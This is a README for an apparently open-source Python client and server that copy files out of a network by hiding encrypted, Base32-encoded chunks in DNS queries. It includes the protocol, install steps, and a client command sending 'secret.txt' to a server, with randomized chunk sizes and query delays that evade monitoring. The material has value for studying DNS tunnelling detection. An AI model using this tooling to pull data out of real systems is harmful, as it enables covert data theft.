# DNS Exfiltration Client & Server (v3.0)

This toolkit demonstrates secure, authenticated DNS-based file exfiltration using modern cryptography:

- **True Perfect Forward Secrecy** — both sides generate ephemeral X25519 keypairs per session; no key material is ever persisted to disk
- **Authenticated encryption** using AES-GCM for confidentiality + HMAC-SHA256 for integrity
- **Base32** payload encoding for DNS-safe transfers
- **Chunked UDP DNS queries** for transport
- **Stateless session reassembly** on the server keyed by client UUID

---

## Components

### client.py

- Generates an ephemeral X25519 keypair per transfer
- Sends client public key as a **TXT query** (`<id>-0-0-<b32_pubkey>.<domain>`)
- Receives the server's ephemeral public key in the **TXT response**
- Derives a per-transfer AES (32 B) + HMAC (16 B) key via HKDF
- Encrypts file with AES-GCM (12 B nonce), appends HMAC-SHA256 tag
- Base32-encodes the blob, splits into randomized-size subdomains (≤ 52 chars of data)
- Sends data chunks as DNS A queries with configurable inter-query delays (`--low`/`--high`)
- Retries failed queries up to `MAX_RETRIES`

### server.py

- Listens on a configurable UDP port for DNS queries
- On TXT queries matching `<id>-0-0-<client_pubkey>.<domain>`:
  - Generates an ephemeral X25519 keypair for this session
  - Derives shared AES + HMAC keys via ECDH + HKDF
  - Responds with its ephemeral public key as TXT rdata (TTL=0)
  - Idempotent: retried key exchanges return the cached server pubkey
- On A queries matching `<id>-<idx>-<total>-<chunk>.<domain>`:
  - Buffers Base32 fragments, decodes, verifies HMAC, decrypts AES-GCM
  - Writes plaintext to `output/<id>.bin`
- Cleans up idle sessions periodically

---

## Installation

```bash
git clone https://github.com/bufo333/python-dns-exfiltration-client-server.git
cd python-dns-exfiltration-client-server
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

No key generation step is needed — keys are created ephemerally at runtime.

---

## Usage

### Start Server

```bash
python server.py \
  --port 5300 \
  --domain xf.example.com \
  --output-dir output
```

### Run Client

```bash
python client.py \
  --server-ip   127.0.0.1 \
  --server-port 5300 \
  --domain      xf.example.com \
  --file-path   secret.txt \
  --low         500 \
  --high        1000
```

- `--low` / `--high` specify the minimum/maximum inter-query delay in **ms** (default `500–1000 ms`)
- The client first performs a TXT-based key exchange, then sends encrypted + HMAC-tagged data chunks as A queries

---

## Protocol

1. Client generates session ID + ephemeral X25519 keypair
2. Client sends **TXT query** to `<id>-0-0-<b32_client_pubkey>.<domain>`
3. Server generates ephemeral keypair, derives shared keys
4. Server responds with **TXT record** containing its Base32-encoded ephemeral pubkey (TTL=0)
5. Client parses TXT response, derives the same shared keys
6. Client encrypts file (AES-GCM), appends HMAC tag, Base32-encodes
7. Client sends data chunks as **A queries**: `<id>-<idx>-<total>-<chunk>.<domain>`
8. Server reassembles, verifies HMAC, decrypts, writes output

---

## CLI Reference

**Server**:

```text
usage: server.py [-h]
                 [--port PORT]
                 [--output-dir DIR]
                 [--domain DOMAIN]
```

**Client**:

```text
usage: client.py [-h]
                 [--server-ip IP]
                 [--server-port PORT]
                 [--domain DOMAIN]
                 [--low MS]
                 [--high MS]
                 --file-path FILE_PATH
```

---

## Output

Decrypted files land in `--output-dir` (default `output/`). File names match the session ID (`<id>.bin`).

---

## Security Notes

- Ephemeral X25519 keypairs on **both** sides per session → **true perfect forward secrecy**
- No key material ever touches disk — compromise of the server host reveals nothing about past sessions
- AES-GCM + HMAC → **confidentiality**, **integrity**, **authentication**
- Idle sessions auto-cleaned; per-IP rate limiting on the server

---

## License & Author

**Author:** John Burns
**Date:** 2025-05-07
**License:** GPL-3.0
